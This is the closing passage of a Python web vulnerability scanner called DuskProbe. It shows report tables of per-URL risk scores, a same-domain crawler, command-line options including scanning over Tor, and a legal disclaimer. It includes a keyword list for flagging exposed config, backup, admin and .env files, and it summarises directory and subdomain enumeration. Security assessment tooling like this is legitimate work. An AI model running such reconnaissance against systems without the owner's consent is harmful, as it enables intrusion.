        table.add_column("📊 Response", style="green", width=15)
        table.add_column("🛡️ Headers", style="yellow", width=12)
        table.add_column("📝 Content", style="white", width=12)
        table.add_column("📋 Forms", style="magenta", width=10)
        table.add_column("⚡ JavaScript", style="blue", width=12)
        table.add_column("⚠️ Risk Score", style="red", width=10)
        table.add_column("🚨 Total Issues", style="bold red", width=12)

        # Sort URLs by risk score (highest first)
        sorted_urls = sorted(
            per_url_data.items(),
            key=lambda x: x[1].get('risk_score', 0),
            reverse=True
        )

        for url, vuln_data in sorted_urls:
            if 'error' in vuln_data:
                continue
                
            response_analysis = vuln_data.get('response_analysis', {})
            header_analysis = vuln_data.get('header_analysis', {})
            content_analysis = vuln_data.get('content_analysis', {})
            form_analysis = vuln_data.get('form_analysis', {})
            js_analysis = vuln_data.get('javascript_analysis', {})
            
            # Truncate URL for display
            display_url = url if len(url) <= 32 else url[:29] + "..."
            
            # Response info
            status_code = response_analysis.get('status_code', 'N/A')
            redirects = "↗️" if response_analysis.get('redirects', False) else "✅"
            response_info = f"{status_code} {redirects}"
            
            # Header security score
            header_score = header_analysis.get('security_score', 0)
            header_status = "🛡️" if header_score > 70 else "⚠️" if header_score > 40 else "🚨"
            header_info = f"{header_score}% {header_status}"
            
            # Content analysis
            content_issues = len(content_analysis.get('security_concerns', []))
            content_info = f"{content_issues} issues" if content_issues > 0 else "Clean"
            
            # Form analysis
            form_issues = len(form_analysis.get('insecure_forms', []))
            total_forms = form_analysis.get('total_forms', 0)
            form_info = f"{form_issues}/{total_forms}" if total_forms > 0 else "None"
            
            # JavaScript analysis
            js_issues = len(js_analysis.get('potential_issues', []))
            js_scripts = js_analysis.get('script_count', 0)
            js_info = f"{js_issues} risks" if js_issues > 0 else f"{js_scripts} scripts"
            
            # Risk score and total issues
            risk_score = vuln_data.get('risk_score', 0)
            total_issues = vuln_data.get('vulnerability_count', 0)
            
            # Risk level color coding
            if risk_score >= 70:
                risk_style = "bold red"
            elif risk_score >= 40:
                risk_style = "yellow"
            else:
                risk_style = "green"
            
            table.add_row(
                display_url,
                response_info,
                header_info,
                content_info,
                form_info,
                js_info,
                f"[{risk_style}]{risk_score}[/{risk_style}]",
                f"[bold]{total_issues}[/bold]"
            )

        # Display the per-URL table
        if table.row_count > 0:
            self.console.print(table)
            
            # Detailed vulnerability breakdown for high-risk URLs
            high_risk_urls = [
                (url, data) for url, data in per_url_data.items()
                if data.get('risk_score', 0) >= 50 and 'error' not in data
            ]
            
            if high_risk_urls:
                self._display_high_risk_url_details(high_risk_urls[:5])  # Show top 5

    def _display_high_risk_url_details(self, high_risk_urls: List[tuple]):
        """Display detailed vulnerability information for high-risk URLs"""
        
        for url, vuln_data in high_risk_urls:
            # Create detailed panel for each high-risk URL
            details = []
            
            # Header security issues
            header_analysis = vuln_data.get('header_analysis', {})
            missing_headers = header_analysis.get('missing_headers', [])
            if missing_headers:
                details.append(f"🛡️ [bold red]Missing Security Headers:[/bold red]")
                for header in missing_headers[:3]:  # Show top 3
                    details.append(f"   • {header}")
            
            # Content security issues
            content_analysis = vuln_data.get('content_analysis', {})
            security_concerns = content_analysis.get('security_concerns', [])
            if security_concerns:
                details.append(f"📝 [bold red]Content Security Issues:[/bold red]")
                for concern in security_concerns[:3]:  # Show top 3
                    details.append(f"   • {concern}")
            
            # Form security issues
            form_analysis = vuln_data.get('form_analysis', {})
            insecure_forms = form_analysis.get('insecure_forms', [])
            if insecure_forms:
                details.append(f"📋 [bold red]Form Security Issues:[/bold red]")
                for form_issue in insecure_forms[:3]:  # Show top 3
                    details.append(f"   • {form_issue}")
            
            # JavaScript security issues
            js_analysis = vuln_data.get('javascript_analysis', {})
            js_issues = js_analysis.get('potential_issues', [])
            if js_issues:
                details.append(f"⚡ [bold red]JavaScript Security Issues:[/bold red]")
                for js_issue in js_issues[:3]:  # Show top 3
                    details.append(f"   • {js_issue}")
            
            if details:
                # Truncate URL for title
                display_url = url if len(url) <= 60 else url[:57] + "..."
                risk_score = vuln_data.get('risk_score', 0)
                
                detail_panel = Panel(
                    '\n'.join(details),
                    title=f"[bold red]🚨 High-Risk URL Details (Risk: {risk_score}%) - {display_url}[/bold red]",
                    expand=False,
                    border_style="red"
                )
                self.console.print(detail_panel)

    def _generate_structure_analysis_summary(self, structure_data: Dict) -> str:
        """Generate summary of website structure analysis"""
        summary_parts = []
        
        # URL discovery summary
        discovered_urls = structure_data.get('discovered_urls', [])
        crawl_stats = structure_data.get('crawl_statistics', {})
        
        if len(discovered_urls) > 100:
            summary_parts.append(f"🗺️ [bold blue]EXTENSIVE MAPPING:[/bold blue] {len(discovered_urls)} URLs discovered - comprehensive site coverage")
        elif len(discovered_urls) > 30:
            summary_parts.append(f"🗺️ [bold blue]THOROUGH MAPPING:[/bold blue] {len(discovered_urls)} URLs mapped")
        
        # Robots.txt findings
        robots_analysis = structure_data.get('robots_analysis', {})
        interesting_findings = robots_analysis.get('interesting_findings', [])
        if interesting_findings:
            summary_parts.append(f"🚨 [bold red]ROBOTS.TXT DISCLOSURE:[/bold red] {len(interesting_findings)} sensitive path(s) exposed")
        
        # Directory enumeration findings
        directory_enum = structure_data.get('directory_enumeration', {})
        interesting_files = directory_enum.get('interesting_files', [])
        if interesting_files:
            sensitive_files = [f for f in interesting_files if any(keyword in f['url'].lower() for keyword in ['config', 'backup', 'admin', '.env'])]
            if sensitive_files:
                summary_parts.append(f"🚨 [bold red]CRITICAL FILE EXPOSURE:[/bold red] {len(sensitive_files)} sensitive file(s) accessible")
        
        # Subdomain findings
        subdomain_enum = structure_data.get('subdomain_enumeration', {})
        interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
        if interesting_subdomains:
            summary_parts.append(f"⚠️ [bold yellow]HIGH-RISK SUBDOMAINS:[/bold yellow] {len(interesting_subdomains)} critical subdomain(s) found")
        
        # Per-URL vulnerability summary
        per_url_data = structure_data.get('per_url_vulnerabilities', {})
        if per_url_data:
            high_risk_count = sum(1 for data in per_url_data.values() if data.get('risk_score', 0) >= 50)
            total_analyzed = len([data for data in per_url_data.values() if 'error' not in data])
            
            if high_risk_count > 0:
                summary_parts.append(f"🚨 [bold red]HIGH-RISK URLS:[/bold red] {high_risk_count}/{total_analyzed} URLs require immediate attention")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Website structure analysis completed - comprehensive mapping successful[/bold green]")
        
        return '\n'.join(summary_parts)


# --- Main Execution Logic ---

async def simple_crawl(session: AsyncSession, url: str, max_depth: int = 1) -> Set[str]:
    """Crawl a website to find links, asynchronously."""
    links = set()
    queue = asyncio.Queue()
    await queue.put((url, 0))
    processed_urls = {url}
    
    while not queue.empty():
        current_url, depth = await queue.get()
        if depth > max_depth:
            continue
        
        links.add(current_url)
        status, _, content, _ = await session.get(current_url)
        if status != 200 or not content:
            continue

        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"
        if BS4_AVAILABLE:
            soup = BeautifulSoup(content, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = urljoin(base_url, link['href'].split('#')[0])
                if urlparse(href).netloc == urlparse(base_url).netloc and href not in processed_urls:
                    await queue.put((href, depth + 1))
                    processed_urls.add(href)
    return links

async def run_scan(config: DuskProbeConfig, url: str, progress, task_id):
    """Coroutine to run a complete scan on a single URL."""
    async with AsyncSession(config) as session:
        checker = SecurityChecker(session, config)
        scan_results = await checker.full_check(url, progress, task_id)
        return scan_results

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DuskProbe v5.0 - Advanced Asynchronous Web Vulnerability Scanner", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-u', '--url', help='Single URL to scan.')
    parser.add_argument('-b', '--batch', help='File containing a list of URLs to scan.')
    parser.add_argument('-o', '--output', help='Output file path for the report.')
    parser.add_argument('-f', '--format', default='json', choices=['json', 'csv', 'html', 'text'], help='Report format.')
    parser.add_argument('-c', '--config', help=f'Path to a YAML configuration file (default: {CONFIG_FILE}).')
    parser.add_argument('--crawl', action='store_true', help='Enable crawling to discover more URLs from the initial target.')
    parser.add_argument('--output-dir', help='Directory to save reports (default: ./reports).')
    parser.add_argument('--log-dir', help='Directory to save logs (default: ./logs).')
    parser.add_argument('--tor', action='store_true', help='Use Tor for scanning (requires Tor service running).')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (DEBUG level).')
    parser.add_argument('-q', '--quiet', action='store_true', help='Suppress all console output except for final report if specified.')
    return parser.parse_args()

def display_professional_footer():
    """Display professional footer with completion message and contact information."""
    console.print("\n")
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print()
    console.print("[bold red]                        🎯 SCAN COMPLETED SUCCESSFULLY 🎯[/bold red]")
    console.print()
    console.print("[bold black]                     Thank you for using DuskProbe Scanner[/bold black]")
    console.print("[bold black]                   Your security assessment is now complete[/bold black]")
    console.print()
    console.print("[bold red]Star Repository:[/bold red] [bold black]Please star us at https://github.com/la-b-ib/DuskProbe[/bold black]")
    console.print("[bold red]Updates:[/bold red]         [bold black]Check for latest version at https://github.com/la-b-ib/DuskProbe[/bold black]")
    console.print("[bold red]Contact:[/bold red]         [bold black]labib-x@protonmail.com[/bold black]")
    console.print("[bold red]Security:[/bold red]        [bold black]Use responsibly and only on authorized targets[/bold black]")
    console.print()
    console.print("[bold black]                © 2025 Labib Bin Shahed. All rights reserved.[/bold black]")
    console.print("[bold black]           Professional Security Testing | Ethical Hacking | Research[/bold black]")
    console.print()
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print("\n")

async def main():
    """Main entry point for the asynchronous scanner."""
    args = parse_arguments()
    config = DuskProbeConfig(args)
    
    # Display professional banner
    console.print("\n")
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print()
    console.print("[bold red]                    🔍 DUSKPROBE SECURITY SCANNER 🔍[/bold red]")
    console.print("[bold black]            Advanced Web Application Vulnerability Assessment Tool[/bold black]")
    console.print()
    console.print("[bold black]                                 Version 5.0.0[/bold black]")
    console.print()
    console.print("[bold red]Developer:[/bold red]  [bold black]Labib Bin Shahed[/bold black]")
    console.print("[bold red]GitHub:[/bold red]     [bold black]https://github.com/la-b-ib[/bold black]")
    console.print("[bold red]Contact:[/bold red]    [bold black]labib-x@protonmail.com[/bold black]")
    console.print("[bold red]License:[/bold red]    [bold black]MIT License - Educational & Professional Use[/bold black]")
    console.print()
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print()
    
    # Display legal disclaimer for all users
    console.print("[bold black]" + "="*80 + "[/bold black]")
    console.print("[bold red]⚠️  DUSKPROBE SECURITY SCANNER - LEGAL DISCLAIMER ⚠️[/bold red]")
    console.print("[bold black]" + "="*80 + "[/bold black]")
    console.print("[bold yellow]AUTHORIZED USE ONLY: This cybersecurity assessment tool is exclusively intended[/bold yellow]")
    console.print("[bold yellow]for legitimate security professionals, penetration testers, and authorized[/bold yellow]")
    console.print("[bold yellow]personnel conducting lawful security evaluations with explicit written consent.[/bold yellow]")
    console.print("[bold black][/bold black]")
    console.print("[bold cyan]By executing this software, you certify that you possess valid authorization[/bold cyan]")
    console.print("[bold cyan]from the target system owner(s) and acknowledge full compliance with all[/bold cyan]")
    console.print("[bold cyan]applicable federal, state, local, and international cybersecurity regulations.[/bold cyan]")
    console.print("[bold black][/bold black]")
    console.print("[bold red]WARNING: Unauthorized scanning, testing, or access to computer systems[/bold red]")
    console.print("[bold red]may constitute a criminal offense under computer fraud and abuse laws.[/bold red]")
    console.print("[bold red]Users assume complete legal responsibility for all scanning activities.[/bold red]")
    console.print("[bold black]" + "="*80 + "[/bold black]")
    
    if config.args.tor:
        if not TOR_AVAILABLE:
            config.console.print("[bold red]Tor dependencies not found. Please install 'stem'.[/bold red]")
            sys.exit(1)
        config.console.print("[bold blue]Tor support is enabled (ensure Tor service is running).[/bold blue]")

    urls_to_scan = set()
    if config.args.url: urls_to_scan.add(config.args.url)
    if config.args.batch:
        try:
            with open(config.args.batch, 'r') as f: urls_to_scan.update(line.strip() for line in f if line.strip() and not line.strip().startswith('#'))
        except FileNotFoundError:
            config.console.print(f"❌ [bold red]Batch file not found:[/bold red] {config.args.batch}"); sys.exit(1)

    if not urls_to_scan:
        config.console.print("[bold red]❌ No URLs provided for scanning.[/bold red]")
        config.console.print("[bold yellow]Please provide a URL using -u <URL> or a batch file using -b <file>[/bold yellow]")
        config.console.print("[bold cyan]Example: python duskprobe.py -u https://example.com[/bold cyan]")
        sys.exit(1)

    if config.args.crawl:
        async with AsyncSession(config) as session:
            initial_urls = list(urls_to_scan)
            for u in initial_urls:
                crawled_links = await simple_crawl(session, u, max_depth=1)
                urls_to_scan.update(crawled_links)

    total_urls = len(urls_to_scan)
    config.console.print(f"🚀 [bold]Starting scan for {total_urls} URL(s)...[/bold]")

    all_results = []
    progress_columns = [SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), TextColumn("{task.completed} of {task.total} steps")]
    with Progress(*progress_columns, console=console, transient=False) as progress:
        scan_tasks_map = {url: progress.add_task(f"[cyan]Scanning {url[:70]}...", total=100) for url in urls_to_scan}
        tasks = [run_scan(config, url, progress, task_id) for url, task_id in scan_tasks_map.items()]
        results = await asyncio.gather(*tasks)
        all_results.extend(results)

    # Generate comprehensive report after all scans complete
    if total_urls == 1:
        # Single URL scan - show detailed report
        report = Report(config)
        report.generate_report(all_results[0])
    elif total_urls > 1:
        # Multiple URLs - show aggregated report
        final_findings = [finding for res in all_results if res for finding in res.get('findings', [])]
        aggregated_results = {
            'url': f'Multiple Targets ({total_urls} URLs)', 
            'findings': final_findings, 
            'site_info': {
                'url': f'{total_urls} URLs scanned',
                'total_findings': len(final_findings),
                'critical_findings': len([f for f in final_findings if f.get('severity') == 'CRITICAL']),
                'high_findings': len([f for f in final_findings if f.get('severity') == 'HIGH'])
            }
        }
        final_report = Report(config)
        final_report.generate_report(aggregated_results)

    # Display professional footer
    display_professional_footer()
    
    exit_code = 1 if any(res.get('findings') for res in all_results if res) else 0
    sys.exit(exit_code)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Scan interrupted by user.[/bold yellow]")
        sys.exit(130)
    except Exception as e:
        console.print(f"🔥 [bold red]An unexpected error occurred:[/bold red]")
        console.print_exception(show_locals=True)
        sys.exit(2)